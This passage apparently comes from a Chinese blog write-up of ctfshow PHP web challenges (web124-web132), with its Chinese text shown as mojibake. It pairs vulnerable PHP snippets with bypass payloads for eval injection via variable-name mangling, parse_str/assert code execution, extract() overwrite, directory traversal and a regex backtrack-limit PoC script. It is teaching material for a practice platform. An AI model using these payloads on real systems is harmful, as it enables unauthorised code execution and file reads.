single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>åœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸º_ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡ºCTF_SHOW.COMè¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰.)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º_ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p><p>Payload:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h4 id="web125-SERVER-â€˜argvâ€™-ç»•è¿‡"><a href="#web125-SERVER-â€˜argvâ€™-ç»•è¿‡" class="headerlink" title="web125($_SERVER[â€˜argvâ€™]ç»•è¿‡)"></a>web125($_SERVER[â€˜argvâ€™]ç»•è¿‡)</h4><p>åˆ©ç”¨$_SERVER[â€˜argvâ€™]</p><blockquote><p>parse_str(ï¼‰å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚<br>æ³¨é‡Šï¼šå¦‚æœæœªè®¾ç½®arrayå‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚<br>æ³¨é‡Šï¼šphp.ini æ–‡ä»¶ä¸­çš„ magic_quotes_gpc è®¾ç½®å½±å“è¯¥å‡½æ•°çš„è¾“å‡ºã€‚å¦‚æœå·²å¯ç”¨ï¼Œé‚£ä¹ˆåœ¨ parse_strOï¼‰è§£æä¹‹å‰ï¼Œå˜é‡ä¼šè¢« addslashesOè½¬æ¢ã€‚</p></blockquote><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚</p><p>â€˜argvâ€™</p><p>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query stringã€‚</p><p>æ„æ€å°±æ˜¯é€šè¿‡$_SERVER[â€˜argvâ€™]å°†$aå˜æˆæ•°ç»„ï¼Œå†åˆ©ç”¨æ•°ç»„çš„æ€§è´¨å°†fl0g&#x3D;flag_give_meä¼ å…¥ï¼ŒåŒæ—¶è¿˜ç»•è¿‡ç¬¬ä¸€ä¸ªifä¸­çš„!isset($_GET[â€˜fl0gâ€™]))ï¼Œç”¨+æ¥è¿›è¡Œåˆ†éš”ï¼Œä½¿å¾—æ•°ç»„ä¸­æœ‰å¤šä¸ªæ•°å€¼ã€‚</p><p>æ‰§è¡Œevalå‡½æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œ$cå³æ˜¯parse_str($a[1])ï¼Œä½¿å¾—fl0g&#x3D;flag_give_meï¼Œä»è€Œè¿›å…¥ç¬¬ä¸‰ä¸ªifè¯­å¥ã€‚</p><p>Payload:</p><blockquote><p>GET:?1&#x3D;flag.php </p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</p></blockquote><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><p>PayloadåŒä¸Š</p><h4 id="web127-extractå˜é‡è¦†ç›–-SERVER-â€˜QUERY-STRINGâ€™"><a href="#web127-extractå˜é‡è¦†ç›–-SERVER-â€˜QUERY-STRINGâ€™" class="headerlink" title="web127(extractå˜é‡è¦†ç›– $_SERVER[â€˜QUERY_STRINGâ€™])"></a>web127(extractå˜é‡è¦†ç›– $_SERVER[â€˜QUERY_STRINGâ€™])</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>extract()</strong> å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p><code>.</code>å’Œ<code>[</code>è¢«è¿‡æ»¤äº†å¯ä»¥ä½¿ç”¨<code> </code>(ç©ºæ ¼)æ¥è¿‡æ»¤</p><p>**$SERVER[â€˜QUERY_STRINGâ€™];**è·å–çš„æŸ¥è¯¢è¯­å¥æ˜¯æœåŠ¡ç«¯è¿˜æ²¡urlè§£ç ä¹‹å‰çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯¹<code>_</code>è¿›è¡Œä¸€æ¬¡urlç¼–ç ä¹Ÿèƒ½ç»•è¿‡ã€‚</p><p>Payload:<code>?ctf%5fshow=ilove36d</code></p><h4 id="web128-gettext"><a href="#web128-gettext" class="headerlink" title="web128(gettext-&gt;_())"></a>web128(gettext-&gt;_())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">å…³äºphpä¸­gettextçš„ç”¨æ³•ï¼Ÿ</a></p><p>å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°</p><p><strong>_()&#x3D;&#x3D;gettext()</strong> æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll</p><p>**get_defined_vars()**å‡½æ•°</p><p>get_defined_vars â€”&gt;è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</p><p>Payload: <code>?f1=_&amp;f2=get_defined_vars</code></p><h4 id="web129-stripos-ç›®å½•ç©¿è¶Š"><a href="#web129-stripos-ç›®å½•ç©¿è¶Š" class="headerlink" title="web129(stripos  ç›®å½•ç©¿è¶Š)"></a>web129(stripos  ç›®å½•ç©¿è¶Š)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>stripos() å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>è¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ã€‚</p><p>ç›®å½•ç©¿è¶Š</p><p>Payload:</p><blockquote><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;flag.php</p><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </p></blockquote><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>1ï¼‰ç¬¬ä¸€ä¸ªåˆ¤æ–­ã€‚<br>.+?è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦ä¸€ä¸ªæˆ–åˆ™å¤šä¸ªã€‚<br>.*? è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦0ä¸ªæˆ–å¤šä¸ªã€‚</p><p>. åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ã€‚</p><ul><li>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚<br>? åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦ã€‚<br>&#x2F;iä¸åŒºåˆ†å¤§å°å†™<br>&#x2F;s åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚<br>é¢˜ä¸­æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€å°±æ˜¯ï¼Œä»¥ä»»æ„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦å¼€å¤´ï¼Œé‡åˆ°ctfshowå°±åŒ¹é…ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œä¸èƒ½æœ‰ä»»ä½•ç©ºç™½å­—ç¬¦ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´è¾“å…¥çš„å†…å®¹é‡Œï¼Œctfshowå‰é¢ä¸èƒ½æœ‰å­—ç¬¦ã€‚</p><p>2ï¼‰ç¬¬äºŒä¸ªåˆ¤æ–­ã€‚striposå‡½æ•°å¦‚æœæœªå‘ç°å­—ç¬¦ä¸²å°†è¿”å› FALSEã€‚<br>å…¨ç­‰äºçš„æ¡ä»¶æ˜¯å¿…é¡»åŒæ–¹çš„ç±»å‹ä¹Ÿä¸€æ ·ï¼Œæ‰€ä»¥ctfshowåœ¨é¦–ä½è¿”å›çš„0ä¸FLASEä¸å…¨ç­‰ã€‚</p><p>æ‰€ä»¥payload:<code>POST:f=ctfshow</code></p><h4 id="web131-æ­£åˆ™æœ€å¤§å›æº¯"><a href="#web131-æ­£åˆ™æœ€å¤§å›æº¯" class="headerlink" title="web131(æ­£åˆ™æœ€å¤§å›æº¯)"></a>web131(æ­£åˆ™æœ€å¤§å›æº¯)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.laruence.com/2010/06/08/1579.html">æ·±æ‚‰æ­£åˆ™(pcre)æœ€å¤§å›æº¯&#x2F;é€’å½’é™åˆ¶</a></p><p>åœ¨phpä¸­æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œè¶…è¿‡é™åˆ¶ç›´æ¥è¿”å›false</p><p>Poc</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># Construct the payload</span>preg <span class="token operator">=</span> <span class="token string">'very'</span> <span class="token operator">*</span> <span class="token number">250000</span> <span class="token operator">+</span> <span class="token string">'36Dctfshow'</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'f'</span><span class="token punctuation">:</span> preg<span class="token punctuation">&#125;</span><span class="token comment"># The target URL</span>url <span class="token operator">=</span> <span class="token string">'https://b8e115f7-c0eb-4c76-9dd8-840b15166fb3.challenge.ctf.show/'</span><span class="token comment"># Send the POST request</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment"># Check for errors and print the response</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Response:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed to get a valid response. Status code:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="web132-PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡"><a href="#web132-PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡" class="headerlink" title="web132(PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡)"></a>web132(PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡)</h4><p>è®¿é—®<code>robots.txt</code>â€“&gt;<code>/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://www.cnblogs.com/hurry-up/p/10220082.html">PHPä¸­é€»è¾‘è¿ç®—ç¬¦çš„é«˜æ•ˆç”¨æ³•â€”&amp;&amp;å’Œ||</a></p><p>å¯¹äºâ€œä¸â€ï¼ˆ**&amp;&amp;<strong>ï¼‰ è¿ç®—ï¼š <strong>x &amp;&amp; y</strong> 